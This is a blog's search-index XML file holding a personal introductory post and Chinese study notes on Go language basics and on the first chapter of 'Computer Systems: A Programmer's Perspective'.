<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>忆我少年游</title>
    <url>/2021/12/01/01-%E5%BF%86%E6%88%91%E5%B0%91%E5%B9%B4%E6%B8%B8/</url>
    <content><![CDATA[<h3 id="忆我少年游，一梦到华胥"><a href="#忆我少年游，一梦到华胥" class="headerlink" title="忆我少年游，一梦到华胥"></a><strong>忆我少年游，一梦到华胥</strong></h3><p>最近真的很喜欢这句话，当然要写文记录呀，我又不是永远18岁~</p>
<p>读研本来就是枯燥、焦虑的过程，想着弄一个私人博客，算是记录一下自己的学习记录、日常啥的。</p>
<p>啥时候忘记学的东西了，方便回来捡一捡，</p>
<p>啥时候难过了，回头看看自己的碎碎念~</p>
<span id="more"></span>

<h3 id="关于内容"><a href="#关于内容" class="headerlink" title="关于内容"></a>关于内容</h3><p>我会整理一些个人所学的知识，不仅限与读研的过程，主要偏向于网络安全、二进制安全方向~</p>
<p>偶尔会记录一些自己的日常啥的。</p>
<h3 id="关于博主"><a href="#关于博主" class="headerlink" title="关于博主"></a>关于博主</h3><p>一个实实在在的理工直男，但总是觉得自己心中有着一个文艺的灵魂。</p>
<p>自认为拥有浪漫、感性的思想，对一切事物都有自己的见解，却总是无法说出口，亦或是用语言表达出来，只能自己暗自神伤，想入非非。</p>
<p>博主某些地方又不像大多数理科男一样，例如脆弱又敏感、无聊又古板。因此想通过空闲时间，写写自己的想法、记录记录自己的日常，改变一下现在的自己吧…<br>“江月何年初照人”，江边的江上的月亮哪一年最初照耀着人？我心中那个完美的生活、更完美的自己、还有那个更美的人啥时候能来到我身边啊…<br>事实上，我也知道：世间万物，求之不得是常态、求之所得是幸事…只能慢慢前进、暗自努力。</p>
<p><a href="https://imgtu.com/i/TYnmLt"><img src="D:/Typora/image/TYnmLt.png" alt="TYnmLt.png" border="0" /></a></p>
<p>愿你我都能不负所望，好好的活下去。</p>
<p>​																																																													——2021.12.02</p>
<p>​																																																												写于深夜11点27分</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>想法</tag>
      </tags>
  </entry>
  <entry>
    <title>Go学习笔记</title>
    <url>/2021/12/21/02-go%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Go语言相关基础知识的学习，主要参考<a href="https://www.runoob.com/go/go-tutorial.html">菜鸟教程</a>上的相关知识。</p>
<h3 id="Go语言结构"><a href="#Go语言结构" class="headerlink" title="Go语言结构"></a>Go语言结构</h3><p>Go基础组成有以下几个部分：</p>
<ul>
<li>包声明</li>
<li>引入包</li>
<li>函数</li>
<li>变量</li>
<li>语句、表达式</li>
<li>注释</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fmt.Printfln(<span class="string">&quot;Hello,world!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>几点注意：</p>
<blockquote>
<ul>
<li>一般来说启动后第一个执行的是main函数，但如果有init()函数则会先执行该函数</li>
<li>当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个<strong>大写字母</strong>开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为<strong>导出</strong>（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是<strong>可见并且可用</strong>的（像面向对象语言中的 protected ）</li>
<li>“{“符号不能单独放在一行</li>
<li>文件夹名、文件名和包名没有直接关系，但同一个文件夹下的文件只能有一个包名</li>
</ul>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291514046.png"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">[Running] <span class="keyword">go</span> run <span class="string">&quot;d:\VScode\Go\project\hello\main\main.go&quot;</span></span><br><span class="line"># command-line-arguments</span><br><span class="line">project\hello\main\main.<span class="keyword">go</span>:<span class="number">5</span>:<span class="number">6</span>: missing function body</span><br><span class="line">project\hello\main\main.<span class="keyword">go</span>:<span class="number">6</span>:<span class="number">1</span>: syntax <span class="type">error</span>: unexpected semicolon or newline before &#123;</span><br></pre></td></tr></table></figure>

<h3 id="Go语言基础语法"><a href="#Go语言基础语法" class="headerlink" title="Go语言基础语法"></a>Go语言基础语法</h3><h4 id="行分隔符"><a href="#行分隔符" class="headerlink" title="行分隔符"></a>行分隔符</h4><p>一行即为一个语句，每个语句不需要像C一样添加”;”，这些工作由Go编译器完成。如果打算将多个语句放在同一行，则需要用；区分</p>
<h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><p>保留字：</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291514749.png"></p>
<p>预定义标识符：</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291514176.png"></p>
<h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>Go语言使用<strong>fmt.Sprintf</strong>格式化字符串并赋值给新串，一般和Print搭配使用：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">var</span> stockcode=<span class="number">123</span></span><br><span class="line">    <span class="keyword">var</span> enddate=<span class="string">&quot;2020-12-31&quot;</span></span><br><span class="line">    <span class="keyword">var</span> url=<span class="string">&quot;Code=%d&amp;endDate=%s&quot;</span></span><br><span class="line">    <span class="keyword">var</span> target_url=fmt.Sprintf(url,stockcode,enddate)</span><br><span class="line">    fmt.Println(target_url)</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">	Code=<span class="number">123</span>&amp;endDate=<span class="number">2020</span><span class="number">-12</span><span class="number">-31</span></span><br></pre></td></tr></table></figure>

<h3 id="Go语言数据类型"><a href="#Go语言数据类型" class="headerlink" title="Go语言数据类型"></a>Go语言数据类型</h3><ul>
<li>布尔类型</li>
<li>数字类型</li>
<li>字符串类型</li>
<li>派生类型<ul>
<li>指针类型（Pointer）</li>
<li>数组类型</li>
<li>结构化类型(struct)</li>
<li>Channel 类型</li>
<li>函数类型</li>
<li>切片类型</li>
<li>接口类型（interface）</li>
<li>Map 类型</li>
</ul>
</li>
</ul>
<h4 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h4><table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">类型和描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>uint8</strong> 无符号 8 位整型 (0 到 255)</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>uint16</strong> 无符号 16 位整型 (0 到 65535)</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>uint32</strong> 无符号 32 位整型 (0 到 4294967295)</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>uint64</strong> 无符号 64 位整型 (0 到 18446744073709551615)</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>int8</strong> 有符号 8 位整型 (-128 到 127)</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><strong>int16</strong> 有符号 16 位整型 (-32768 到 32767)</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><strong>int32</strong> 有符号 32 位整型 (-2147483648 到 2147483647)</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><strong>int64</strong> 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807)</td>
</tr>
</tbody></table>
<h4 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h4><table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">类型和描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>float32</strong> IEEE-754 32位浮点型数</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>float64</strong> IEEE-754 64位浮点型数</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>complex64</strong> 32 位实数和虚数</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>complex128</strong> 64 位实数和虚数</td>
</tr>
</tbody></table>
<h3 id="Go语言变量"><a href="#Go语言变量" class="headerlink" title="Go语言变量"></a>Go语言变量</h3><p>变量的声明一般用var，可以一次声明多个变量</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier1, identifier2 <span class="keyword">type</span></span><br></pre></td></tr></table></figure>

<h4 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h4><ul>
<li>第一种，指定变量类型，如果没有初始化，则变量默认为零值。</li>
<li>第二种，根据值自行判定变量类型。</li>
<li>第三种，如果变量已经使用 var 声明过了，再使用 *<em>:&#x3D;*</em> 声明变量，就产生编译错误，格式：</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> intVal <span class="type">int</span> </span><br><span class="line">intVal :=<span class="number">1</span> <span class="comment">// 这时候会产生编译错误，因为 intVal 已经声明，不需要重新声明</span></span><br><span class="line"></span><br><span class="line">直接使用以下语句即可：</span><br><span class="line"></span><br><span class="line">intVal := <span class="number">1</span> <span class="comment">// 此时不会产生编译错误，因为有声明新的变量，因为 := 是一个声明语句</span></span><br></pre></td></tr></table></figure>

<h4 id="多变量声明"><a href="#多变量声明" class="headerlink" title="多变量声明"></a>多变量声明</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类型相同多个变量, 非全局变量</span></span><br><span class="line"><span class="keyword">var</span> vname1, vname2, vname3 <span class="keyword">type</span></span><br><span class="line">vname1, vname2, vname3 = v1, v2, v3</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vname1, vname2, vname3 = v1, v2, v3 <span class="comment">// 和 python 很像,不需要显示声明类型，自动推断</span></span><br><span class="line"></span><br><span class="line">vname1, vname2, vname3 := v1, v2, v3 <span class="comment">// 出现在 := 左侧的变量不应该是已经被声明过的，否则会导致编译错误</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这种因式分解关键字的写法一般用于声明全局变量</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    vname1 v_type1</span><br><span class="line">    vname2 v_type2</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>如果声明了一个局部变量<strong>却没有在</strong>相同的代码块中使用它，会得到编译错误，例如下面这个例子当中的变量 a：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> a <span class="type">string</span> = <span class="string">&quot;abc&quot;</span></span><br><span class="line">   fmt.Println(<span class="string">&quot;hello, world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是全局变量是允许声明但不使用的。</p>
<p>并行：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a, b <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> c <span class="type">string</span></span><br><span class="line">a, b, c = <span class="number">5</span>, <span class="number">7</span>, <span class="string">&quot;abc&quot;</span>	<span class="comment">//可称为并行 或 同时 赋值</span></span><br></pre></td></tr></table></figure>

<h5 id="空白标识符"><a href="#空白标识符" class="headerlink" title="空白标识符"></a>空白标识符</h5><blockquote>
<p>空白标识符 _ 也被用于<strong>抛弃值</strong>，如值 5 在：_, b &#x3D; 5, 7 中被抛弃。</p>
<p>_ 实际上是一个<strong>只写变量</strong>，你不能得到它的值。</p>
<p>这样做是因为 Go 语言中你<strong>必须使用所有被声明的变量</strong>，但有时你并不需要使用从一个函数得到的所有返回值。</p>
</blockquote>
<p>例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  _,numb,strs := numbers() <span class="comment">//只获取函数返回值的后两个</span></span><br><span class="line">  fmt.Println(numb,strs)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一个可以返回多个值的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">numbers</span><span class="params">()</span></span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">string</span>)&#123;</span><br><span class="line">  a , b , c := <span class="number">1</span> , <span class="number">2</span> , <span class="string">&quot;str&quot;</span></span><br><span class="line">  <span class="keyword">return</span> a,b,c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Go语言常量"><a href="#Go语言常量" class="headerlink" title="Go语言常量"></a>Go语言常量</h3><p>常量定义格式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> identifier [<span class="keyword">type</span>] = value</span><br></pre></td></tr></table></figure>

<p>常量还可用于枚举</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    Unknown = <span class="number">0</span></span><br><span class="line">    Female = <span class="number">1</span></span><br><span class="line">    Male = <span class="number">2</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h4><p>iota是go里面的<strong>特殊常量</strong>，可以认为是一个可以被编译器修改的常量。</p>
<p><strong>iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</strong></p>
<p>iota用例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">const</span> (</span><br><span class="line">            a = <span class="literal">iota</span>   <span class="comment">//0</span></span><br><span class="line">            b          <span class="comment">//1</span></span><br><span class="line">            c          <span class="comment">//2</span></span><br><span class="line">            d = <span class="string">&quot;ha&quot;</span>   <span class="comment">//独立值，iota += 1</span></span><br><span class="line">            e          <span class="comment">//&quot;ha&quot;   iota += 1</span></span><br><span class="line">            f = <span class="number">100</span>    <span class="comment">//iota +=1</span></span><br><span class="line">            g          <span class="comment">//100  iota +=1</span></span><br><span class="line">            h = <span class="literal">iota</span>   <span class="comment">//7,恢复计数</span></span><br><span class="line">            i          <span class="comment">//8</span></span><br><span class="line">    )</span><br><span class="line">    fmt.Println(a,b,c,d,e,f,g,h,i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出：0 1 2 ha ha 100 100 7 8</span></span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    i=<span class="number">1</span>&lt;&lt;<span class="literal">iota</span></span><br><span class="line">    j=<span class="number">3</span>&lt;&lt;<span class="literal">iota</span></span><br><span class="line">    k</span><br><span class="line">    l</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;i=&quot;</span>,i)</span><br><span class="line">    fmt.Println(<span class="string">&quot;j=&quot;</span>,j)</span><br><span class="line">    fmt.Println(<span class="string">&quot;k=&quot;</span>,k)</span><br><span class="line">    fmt.Println(<span class="string">&quot;l=&quot;</span>,l)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出：</span></span><br><span class="line">i= <span class="number">1</span></span><br><span class="line">j= <span class="number">6</span></span><br><span class="line">k= <span class="number">12</span></span><br><span class="line">l= <span class="number">24</span></span><br></pre></td></tr></table></figure>

<h3 id="Go语言运算符"><a href="#Go语言运算符" class="headerlink" title="Go语言运算符"></a>Go语言运算符</h3><p>这部分没什么好扩充的，记录下容易忘的运算符优先级</p>
<table>
<thead>
<tr>
<th>5</th>
<th>* &#x2F; % &lt;&lt; &gt;&gt; &amp; &amp;^</th>
</tr>
</thead>
<tbody><tr>
<td>4</td>
<td>+ - | ^</td>
</tr>
<tr>
<td>3</td>
<td>&#x3D;&#x3D; !&#x3D; &lt; &lt;&#x3D; &gt; &gt;&#x3D;</td>
</tr>
<tr>
<td>2</td>
<td>&amp;&amp;</td>
</tr>
<tr>
<td>1</td>
<td>||</td>
</tr>
</tbody></table>
<h3 id="Go的条件语句"><a href="#Go的条件语句" class="headerlink" title="Go的条件语句"></a>Go的条件语句</h3><h4 id="（1）if语句用法"><a href="#（1）if语句用法" class="headerlink" title="（1）if语句用法"></a>（1）if语句用法</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 布尔表达式 &#123;</span><br><span class="line">   <span class="comment">/* 在布尔表达式为 true 时执行 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="（2）if-else语句用法"><a href="#（2）if-else语句用法" class="headerlink" title="（2）if..else语句用法"></a>（2）if..else语句用法</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 布尔表达式 &#123;</span><br><span class="line">   <span class="comment">/* 在布尔表达式为 true 时执行 */</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">/* 在布尔表达式为 false 时执行 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="（3）if嵌套语句"><a href="#（3）if嵌套语句" class="headerlink" title="（3）if嵌套语句"></a>（3）if嵌套语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if 布尔表达式1&#123;</span><br><span class="line">	/* 在布尔表达式 1 为 true 时执行 */</span><br><span class="line">	if 布尔表达式2&#123;</span><br><span class="line">		 /* 在布尔表达式 2 为 true 时执行 */</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="（4）switch语句"><a href="#（4）switch语句" class="headerlink" title="（4）switch语句"></a>（4）switch语句</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> var1 &#123;</span><br><span class="line">    <span class="keyword">case</span> val1:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> val2:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是：</p>
<ul>
<li>支持多条件匹配</li>
<li>不同的 case 之间不使用 break 分隔，默认只会执行一个 case</li>
<li>如果想要执行多个 case，需要使用 fallthrough 关键字，也可用 break 终止</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>(...)&#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fallthrough</span> <span class="comment">// 此时switch(1)会执行case1和case2，但是如果满足if条件，则只执行case1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="（5）select语句"><a href="#（5）select语句" class="headerlink" title="（5）select语句"></a>（5）select语句</h4>]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统(一)</title>
    <url>/2021/12/29/03-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F(%E4%B8%80)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>计算机操作系统部分的知识零零散散学过一些，没有系统性学</p>
<p>遂开始阅读《深入理解计算机系统》这本书</p>
<p>算是为后续校招，平时学习工作打下基础，同时方便后面需要的时候回顾。</p>
<p>本篇是第1章计算机系统漫游部分的笔记记录，应该算是整本书的绪论。</p>
<h1 id="信息就是位-上下文"><a href="#信息就是位-上下文" class="headerlink" title="信息就是位+上下文"></a>信息就是位+上下文</h1><p>本书主要目的是帮助了解你在系统上执行程序时，系统发生了什么以及为什么会这样。</p>
<p>程序是从源程序开始的，源程序实际上就是一个由值0和1组成的位（bit）序列，8个位为一组称为字节。</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291141178.png"></p>
<span id="more"></span>

<p>hello.c的表示方法说明了一个基本思想：<strong>系统中所有的信息，——包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传送的数据，都是由一串比特表示的</strong>。</p>
<h2 id="程序被其他程序翻译成不同的格式"><a href="#程序被其他程序翻译成不同的格式" class="headerlink" title="程序被其他程序翻译成不同的格式"></a>程序被其他程序翻译成不同的格式</h2><p>在Unix系统上，源文件到目标文件的转化是由编译器驱动程序完成的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">linux&gt; gcc -o hello hello.c</span><br></pre></td></tr></table></figure>

<h4 id="编译的四个阶段"><a href="#编译的四个阶段" class="headerlink" title="编译的四个阶段"></a>编译的四个阶段</h4><p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291148695.png"></p>
<p>执行四个阶段的程序构成了<strong>编译系统</strong></p>
<ul>
<li>预处理阶段：根据#字符来定位头文件，并由预处理器插入程序文本</li>
<li>编译阶段：讲文本文件翻译成汇编文件。汇编语言为不同高级语言的不同编译器提供了<strong>通用的输出语言</strong>。</li>
<li>汇编阶段：汇编语言——&gt;机器语言。将指令打包成<strong>可重定位目标程序</strong>的格式，存放在.o文件中，该文件是二进制文件，包含的是main函数的指令编码，所以用文本编辑器打开是一堆乱码。</li>
<li>链接阶段：hello程序调用printf函数，其存在于一个名为printf.o的单独预编译好的目标文件中，因此需要将其合并到hello.o程序中，链接器就负责处理这种合并，输出一个<strong>可执行目标文件</strong>。</li>
</ul>
<h4 id="GNU"><a href="#GNU" class="headerlink" title="GNU"></a>GNU</h4><p>​	GCC是GNU项目开发出的工具之一。该项目开发出了包含Unix操作系统的所有主要部件的环境，除了内核，内核是由Linux项目单独开发出的。</p>
<h2 id="了解编译系统如何工作是大有益处的"><a href="#了解编译系统如何工作是大有益处的" class="headerlink" title="了解编译系统如何工作是大有益处的"></a>了解编译系统如何工作是大有益处的</h2><ul>
<li>优化程序性能</li>
<li>理解链接时出现的错误</li>
<li>避免安全漏洞</li>
</ul>
<h3 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h3><p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291311237.png"></p>
<ul>
<li>1、总线：传输作用。通常被设计成传送定长的字节块（字）。各个系统字中的字节数（字长）不相同，分为4字节（32位）和8字节（64位）</li>
<li>2、I&#x2F;O设备： 长期存储数据和程序的磁盘驱动器（磁盘）也属于I&#x2F;O设备。通常设备和I&#x2F;O总线间有适配器或控制器。</li>
<li>3、主存：临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。</li>
<li>4、处理器：解释、执行存储在主存中指令的引擎。核心是寄存器、PC、ALU。</li>
</ul>
<h3 id="运行hello程序"><a href="#运行hello程序" class="headerlink" title="运行hello程序"></a>运行hello程序</h3><ul>
<li>输入<strong>“.&#x2F;hello”</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291319809.png"></p>
<ul>
<li>运行<strong>“.&#x2F;hello”</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291322127.png"></p>
<ul>
<li>一旦前一步加载完成，处理器就开始执行程序</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291323609.png"></p>
<h2 id="高速缓存至关重要"><a href="#高速缓存至关重要" class="headerlink" title="高速缓存至关重要"></a>高速缓存至关重要</h2><p>通过让高速缓存里存放可能经常访问的数据，大部分的内存操作就能在快速的高速缓存中完成。</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291323931.png"></p>
<h3 id="存储设备形成层次结构"><a href="#存储设备形成层次结构" class="headerlink" title="存储设备形成层次结构"></a>存储设备形成层次结构</h3><p>在处理和较大较慢的设备（主存）之间插入一个更小更快的存储设备（高速缓存）的思想已经成为普遍观念。</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291325136.png"></p>
<p>​	存储器层次结构的主要思想：上一层的存储器作为第一层存储器的高速缓存。</p>
<h3 id="操作系统管理硬件"><a href="#操作系统管理硬件" class="headerlink" title="操作系统管理硬件"></a>操作系统管理硬件</h3><p>所有应用程序对硬件的操作尝试都必须经过操作系统</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291327391.png"></p>
<p>操作系统的两个基本功能：</p>
<ul>
<li>防止硬件被失控的应用程序滥用</li>
<li>向应用程序提供简单一致的机制来控制复杂而不相同的低级硬件设备</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291332882.png"></p>
<p>三个基本的抽象：</p>
<ul>
<li>文件是对I&#x2F;O设备的抽象</li>
<li>虚拟内存是对主存和磁盘的抽象</li>
<li>进程是处理器、主存和I&#x2F;O设备的抽象</li>
</ul>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>进程是操作系统对一个正在运行的程序的一种抽象，一个系统上可以同时运行多个进程。</p>
<p>而<strong>并发运行</strong>，则是说一个进程的指令和另一个进程的指令是<strong>交错执行</strong>的。大多数系统，需要运行的进程数可以多于运行它们的CPU个数（CPU就几个核？）。一个CPU看上去实在并发执行多个进程，实际是在进程间来回切换实现的。操作系统实现这种交错执行的机制为<strong>上下文切换</strong>。</p>
<p>上下文信息主要包括PC、寄存器文件当前值、主存内容等。</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291339690.png"></p>
<p>切换过程主要由操作系统内核（kernel）管理的。</p>
<ul>
<li><strong>当应用程序需要操作系统的某些操作时，例如读写文件，就执行一条特殊的系统调用指令，将控制权交给内核，然后内核执行被请求的操作并返回应用程序。</strong></li>
</ul>
<h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>一个进程由多个线程组成，每个线程都运行在进程上下文中，共享同样的代码和全局数据。多线程之间比多进程之间更容易共享数据，因此线程一般比进程更高效。</p>
<h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291352379.png"></p>
<ul>
<li>程序代码和数据区：对所有进程来说，代码都从同一固定地址开始。</li>
<li>堆：虽然代码和数据区在进程开始就被定义了大小，但调用malloc和free这样的c标准库函数时，堆可以动态扩展、收缩</li>
<li>共享库：存放C标准库和数学库等共享库的代码和数据</li>
<li>栈：位于用户虚拟地址空间顶部。编译器用其来实现函数调用，同样可动态扩展和收缩。</li>
<li>内核虚拟内存：不允许应用程序读写这俄格区域的内容或者直接调用内核代码定义的函数，需要调用内核才能执行这些操作。</li>
</ul>
<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><p>​	文件就是<strong>字节序列</strong>，每个I&#x2F;O设备，包括磁盘、键盘、显示器甚至网络<strong>都可以看成文件</strong>、系统中所有输入输出都是通过使用一小组成为Unix I&#x2F;O的系统函数调用读写文件实现的。</p>
<h2 id="网络也是一种I-x2F-O设备"><a href="#网络也是一种I-x2F-O设备" class="headerlink" title="网络也是一种I&#x2F;O设备"></a>网络也是一种I&#x2F;O设备</h2><p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291407156.png"></p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291407018.png" alt="image-20211229140717950"></p>
<h3 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h3><p>并发：一个同时具有多个活动的系统</p>
<p>并行：用并发来使一个系统运行得更快</p>
<h4 id="线程级并发"><a href="#线程级并发" class="headerlink" title="线程级并发"></a>线程级并发</h4><p>构建在进程这个抽象上，我们可以设计出同时有多个程序执行得系统，也就是<strong>并发</strong>。</p>
<p>那么在线程上，我们可以在<strong>一个进程</strong>里面执行<strong>多个控制流</strong>，这就是线程级并发。</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291412574.png"></p>
